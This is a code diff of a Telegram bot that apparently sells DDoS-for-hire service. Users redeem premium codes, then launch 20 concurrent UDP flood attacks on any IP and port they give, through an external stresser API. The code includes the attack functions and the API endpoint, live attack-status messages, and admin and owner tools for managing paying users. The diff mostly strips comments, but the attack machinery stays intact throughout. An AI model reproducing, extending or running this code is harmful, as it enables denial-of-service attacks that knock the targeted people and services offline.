@@ -1,4 +1,4 @@
-# app.py - COMPLETE FIXED VERSION WITH ALL FEATURES WORKING
+# app.py - COMPLETE FIXED VERSION
 import os
 import logging
 import asyncio
@@ -141,7 +141,6 @@ class Database:
     
     def update_user_plan(self, user_id, plan, expiry):
         if not self.memory_mode:
-            # Convert datetime to string for MongoDB
             expiry_str = expiry.isoformat() if expiry and isinstance(expiry, datetime) else None
             result = self.users.update_one(
                 {"user_id": user_id},
@@ -192,7 +191,6 @@ class Database:
                 "added_by": added_by,
                 "added_at": datetime.now()
             })
-            # Give admin LIFETIME premium access
             self.update_user_plan(user_id, "premium", None)
             return True
         else:
@@ -286,12 +284,10 @@ class Database:
         if not self.memory_mode:
             code_data = self.codes.find_one({"code": code, "is_used": False})
             if code_data:
-                # Mark code as used
                 self.codes.update_one(
                     {"code": code},
                     {"$set": {"is_used": True, "used_by": user_id, "used_at": datetime.now()}}
                 )
-                # Update user plan
                 expiry = datetime.now() + timedelta(days=code_data['access_days'])
                 self.update_user_plan(user_id, "premium", expiry)
                 self.users.update_one(
@@ -377,7 +373,6 @@ db = Database(MONGO_URI)
 
 # ===== INITIALIZE OWNER =====
 def init_owner():
-    """Ensure owner exists in database"""
     owner = db.get_user(OWNER_ID)
     if not owner:
         db.add_user(OWNER_ID, "owner", "Owner")
@@ -385,7 +380,6 @@ def init_owner():
     if not db.is_admin(OWNER_ID):
         db.add_admin(OWNER_ID, "owner", "owner", OWNER_ID)
     
-    # Ensure owner has LIFETIME premium
     plan, expiry = db.get_user_plan(OWNER_ID)
     if plan != "premium":
         db.update_user_plan(OWNER_ID, "premium", None)
@@ -478,7 +472,6 @@ attack_manager = AttackManager()
 
 # ===== SEND ALERT TO ADMINS =====
 async def send_attack_alert(attack_info):
-    """Send real-time attack alert to all admins"""
     try:
         admins = db.get_admins()
         user = db.get_user(attack_info['user_id'])
@@ -512,7 +505,6 @@ async def send_attack_alert(attack_info):
 
 # ===== API-ONLY UDP ATTACK =====
 async def send_udp_attack(target, port, duration, attack_num):
-    """API-ONLY UDP attack - No fallback"""
     url = "https://api.susstresser.com/panel/api/api.php"
     
     params = {
@@ -566,10 +558,8 @@ async def send_udp_attack(target, port, duration, attack_num):
 
 # ===== 20 CONCURRENT ATTACKS WITH LIVE UPDATES =====
 async def send_20_concurrent_attacks(target, port, duration, user_id, context):
-    """Launch 20 concurrent API attacks with live time updates"""
     logger.info(f"🚀 Launching 20 concurrent UDP attacks on {target}:{port}")
     
-    # Create status message for user
     status_msg = await context.bot.send_message(
         chat_id=user_id,
         text=f"🔥 *ATTACK RUNNING*\n\n"
@@ -581,24 +571,17 @@ async def send_20_concurrent_attacks(target, port, duration, user_id, context):
         parse_mode='Markdown'
     )
     
-    # Start attacks
     tasks = []
     for i in range(1, 21):
         task = send_udp_attack(target, port, duration, i)
         tasks.append(task)
     
-    # Update timer every 5 seconds
     timer_task = asyncio.create_task(update_timer(status_msg, duration, target, port))
-    
-    # Wait for attacks to complete
     results = await asyncio.gather(*tasks)
-    
-    # Stop timer
     timer_task.cancel()
     
     success_count = sum(1 for r in results if r.get('success', False))
     
-    # Final message
     final_text = (
         f"✅ *20x UDP ATTACK COMPLETE!*\n\n"
         f"🎯 Target: `{target}:{port}`\n"
@@ -620,7 +603,6 @@ async def send_20_concurrent_attacks(target, port, duration, user_id, context):
     }
 
 async def update_timer(status_msg, duration, target, port):
-    """Update the timer every 5 seconds"""
     try:
         start_time = time.time()
         last_update = 0
@@ -632,7 +614,6 @@ async def update_timer(status_msg, duration, target, port):
             if remaining <= 0:
                 break
             
-            # Update every 5 seconds
             if int(elapsed) % 5 == 0 and int(elapsed) != last_update:
                 last_update = int(elapsed)
                 try:
@@ -660,22 +641,16 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     user_id = user.id
     
-    # Add user to database
     db.add_user(user_id, user.username, user.first_name)
     
-    # Check if user has premium
     plan, expiry = db.get_user_plan(user_id)
-    
-    # Check if user is admin
     is_admin = db.is_admin(user_id)
     
     logger.info(f"User {user_id} - Plan: {plan}, Expiry: {expiry}, Is Admin: {is_admin}")
     
-    # ALL users can access the bot
     stats = attack_manager.get_stats()
     total_attacks = db.get_user_stats(user_id)
     
-    # Show plan status
     if plan == "premium":
         if expiry:
             days_left = max(0, (expiry - datetime.now()).days)
@@ -696,7 +671,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"{'💡 Use /redeem CODE to get premium access!' if plan != 'premium' else '🎯 Use /attack to start attacking!'}"
     )
     
-    # Build keyboard based on plan
     keyboard = []
     if not db.is_banned(user_id):
         if plan == "premium" or is_admin:
@@ -1082,7 +1056,7 @@ async def process_gen_callback(update: Update, context: ContextTypes.DEFAULT_TYP
     
     data = query.data.split('_')[1]
     if data == "lifetime":
-        days = 3650  # 10 years
+        days = 3650
     else:
         days = int(data.replace('d', ''))
     
@@ -1635,14 +1609,12 @@ def run_bot():
     app.add_handler(CommandHandler("cancel", cancel))
     
     # ===== CALLBACK QUERY HANDLERS =====
-    # Main
     app.add_handler(CallbackQueryHandler(attack_callback, pattern="^attack$"))
     app.add_handler(CallbackQueryHandler(my_plan_callback, pattern="^my_plan$"))
     app.add_handler(CallbackQueryHandler(info_callback, pattern="^info$"))
     app.add_handler(CallbackQueryHandler(stats_callback, pattern="^stats$"))
     app.add_handler(CallbackQueryHandler(back_callback, pattern="^back$"))
     
-    # Admin
     app.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin$"))
     app.add_handler(CallbackQueryHandler(admin_gen_callback, pattern="^admin_gen$"))
     app.add_handler(CallbackQueryHandler(process_gen_callback, pattern="^gen_"))
@@ -1650,7 +1622,6 @@ def run_bot():
     app.add_handler(CallbackQueryHandler(admin_delete_callback, pattern="^admin_delete$"))
     app.add_handler(CallbackQueryHandler(process_delete_callback, pattern="^del_"))
     
-    # Owner
     app.add_handler(CallbackQueryHandler(owner_callback, pattern="^owner$"))
     app.add_handler(CallbackQueryHandler(owner_kill_switch_callback, pattern="^owner_kill$"))
     app.add_handler(CallbackQueryHandler(owner_promote_callback, pattern="^owner_promote$"))
@@ -1662,28 +1633,25 @@ def run_bot():
     app.add_handler(CallbackQueryHandler(owner_banned_users, pattern="^owner_banned_users$"))
     app.add_handler(CallbackQueryHandler(process_demote, pattern="^demote_"))
     
-    # ===== MESSAGE HANDLERS (Lowest Priority - Use specific filters) =====
-    # IMPORTANT: Order matters - most specific first
-    
-    # 1. Promote handler - expects "USER_ID ROLE" where ROLE is admin or pseudo_owner
+    # ===== MESSAGE HANDLERS (Lowest Priority) =====
+    # Only process text messages that are NOT commands
+    # The ~filters.COMMAND filter ensures commands are NOT processed here
     app.add_handler(MessageHandler(
         filters.TEXT & ~filters.COMMAND & filters.Regex(r'^\d+\s+(admin|pseudo_owner)$'), 
         process_promote
     ))
     
-    # 2. Ban handler - expects "USER_ID" or "USER_ID reason"
     app.add_handler(MessageHandler(
         filters.TEXT & ~filters.COMMAND & filters.Regex(r'^\d+(\s+.+)?$'), 
         process_ban
     ))
     
-    # 3. Unban handler - expects just "USER_ID"
     app.add_handler(MessageHandler(
         filters.TEXT & ~filters.COMMAND & filters.Regex(r'^\d+$'), 
         process_unban
     ))
     
-    # 4. Attack handler - catches anything else (IP PORT TIME format)
+    # Catch-all for any other text messages (attack commands, etc.)
     app.add_handler(MessageHandler(
         filters.TEXT & ~filters.COMMAND, 
         process_attack
